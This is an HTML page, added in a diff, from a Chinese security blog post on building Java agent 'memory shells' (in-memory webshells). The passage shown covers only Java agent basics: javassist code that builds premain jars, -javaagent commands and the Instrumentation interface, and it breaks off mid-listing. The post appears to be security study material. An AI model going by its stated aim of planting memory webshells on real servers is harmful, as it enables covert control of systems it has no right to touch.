@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Ko1sh1">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/03/13/从agent到内存马/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="最近学其他内容发现需要 agent，索性复习了一下 agent 内存马，代码同步在了 https:&#x2F;&#x2F;github.com&#x2F;Ko1sh1&#x2F;Agent2Mem">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从 agent 到内存马">
+<meta property="og:url" content="http://example.com/2024/03/13/%E4%BB%8EAgent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="最近学其他内容发现需要 agent，索性复习了一下 agent 内存马，代码同步在了 https:&#x2F;&#x2F;github.com&#x2F;Ko1sh1&#x2F;Agent2Mem">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/blog/image-20240311154518684.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240311214358589.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240313084226042.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240313112914457.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240313120236311.png">
+<meta property="article:published_time" content="2024-03-13T03:56:54.000Z">
+<meta property="article:modified_time" content="2024-03-13T04:06:04.755Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="技巧">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/blog/image-20240311154518684.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+    <meta name="theme-color" content="#FFA07A">
+    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            从 agent 到内存马 -
+        
+        Ko1sh1&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/text.js'></script>
+                
+    
+            
+                
+                    <link rel='stylesheet' href='/css/mouse.css'>
+                
+    
+
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ko1sh1&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links/">
+                                                    师傅们
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links/">师傅们</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/masonry"
+                        >
+                            <span>Photos</span>
+                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/images/blog4.jpg" alt="从 agent 到内存马" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">从 agent 到内存马</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-03-13 11:56:54</span>
+        <span class="mobile">2024-03-13 11:56:54</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-03-13 12:06:04</span>
+            <span class="mobile">2024-03-13 12:06:04</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/java/">java</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%8A%80%E5%B7%A7/">技巧</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>21 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            
+  <div class="note p-4 mb-4 rounded-small primary">
+    <p>之前学 java agant 内存马之后太久没看又给忘了，最近刚好有些内容需要 agent，索性复习一下。</p>
+<p>代码同步在了 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ko1sh1/Agent2Mem" >https://github.com/Ko1sh1/Agent2Mem <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+  </div>
+
+
+
+<h3 id="premain-启动时加载-agent"><a href="#premain-启动时加载-agent" class="headerlink" title="premain-启动时加载 agent"></a>premain-启动时加载 agent</h3><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>可在命令行利用 <strong>-javaagent</strong> 来实现启动时加载</p>
+<p>主要是通过写 premain 函数并在 MANIFEST 中指定 Premain-Class 来在启动另外的类前，先加载 premain 类，懒得创建文件再去编译写 jar 文件了，这里我个简单的一键生成测试 jar 包的脚本</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Attributes;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Manifest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_SimpleExampleMaker</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 创建一个 premain 和需要 被代理的类，具体函数实现请修改 makeClassWithMethod 的第一个参数</span></span><br><span class="line">        Class&lt;?&gt; testClass = makeClassWithMethod(<span class="string">&quot;TestClass&quot;</span>,</span><br><span class="line">                <span class="string">&quot;public static void main(String[] args) &#123; System.out.println(\&quot;Main class Running\&quot;); &#125;&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; premainDemo = makeClassWithMethod(<span class="string">&quot;PremainDemo&quot;</span>,</span><br><span class="line">                <span class="string">&quot;public static void premain(String agentArgs, java.lang.instrument.Instrumentation inst) throws Exception &#123;System.out.println(agentArgs.isEmpty() ? \&quot;null\&quot; : agentArgs);System.out.println(\&quot;premain method is invoked!\&quot;);&#125;&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  创建两个类的jar文件</span></span><br><span class="line">        makePremainJar(premainDemo,<span class="string">&quot;agent.jar&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">        makePremainJar(testClass,<span class="string">&quot;demo.jar&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写好后执行下面的内容：</span></span><br><span class="line">        <span class="comment">// java -javaagent:agent.jar[=options] -jar demo.jar</span></span><br><span class="line">        <span class="comment">// 例如: java -javaagent:agent.jar=koishi -jar demo.jar</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; makeClassWithMethod(String className, String methodBody) <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(className);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(methodBody, ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;premain/src/main/java/javas&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makePremainJar</span><span class="params">(Class compileClass, String jarName, <span class="type">boolean</span> is_premain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarFilePath</span> <span class="operator">=</span> <span class="string">&quot;premain/src/main/java/jars/&quot;</span> + jarName;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> compileClass.getName() + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 Manifest 并设置内容</span></span><br><span class="line">        <span class="type">Manifest</span> <span class="variable">manifest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manifest</span>();</span><br><span class="line">        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, <span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_premain) &#123;</span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Premain-Class&quot;</span>), compileClass.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 class 和  Manifest 写入 jar 文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(jarFilePath);</span><br><span class="line">             <span class="type">JarOutputStream</span> <span class="variable">jos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(fos, manifest)) &#123;</span><br><span class="line">            jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(className));</span><br><span class="line">            <span class="type">byte</span>[] bytes = pool.get(compileClass.getName()).toBytecode();</span><br><span class="line">            jos.write(bytes);</span><br><span class="line">            jos.closeEntry();</span><br><span class="line">            System.out.println(<span class="string">&quot;JAR file created successfully!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行上面的 java 代码后在 jars 目录下执行下面的内容：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:agent.jar[=options] -jar demo.jar</span><br><span class="line">java -javaagent:agent.jar=koishi -jar demo.jar</span><br></pre></td></tr></table></figure></div>
+
+<p>会发现输入以下内容</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">koishi</span><br><span class="line">premain method is invoked!</span><br><span class="line">Main <span class="keyword">class</span> <span class="title class_">Running</span>  </span><br></pre></td></tr></table></figure></div>
+
+<p>可以发现 premain 确实在主要类之前执行了，而且 premain 方法的第一个参数 agentArgs 我们也是可传入的。</p>
+<h4 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h4><p>在实现 premain 的时候，我们除了像上面的例子那样能获取到 agentArgs 参数，还可以获取 Instrumentation 实例。</p>
+<p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p>
+<p>在 Instrumentation 中增加了名叫 Transformer 的 Class 文件转换器，转换器可以改变二进制流的数据，Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码。</p>
+<p>查看 Instrumentation  接口中的类方法：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span 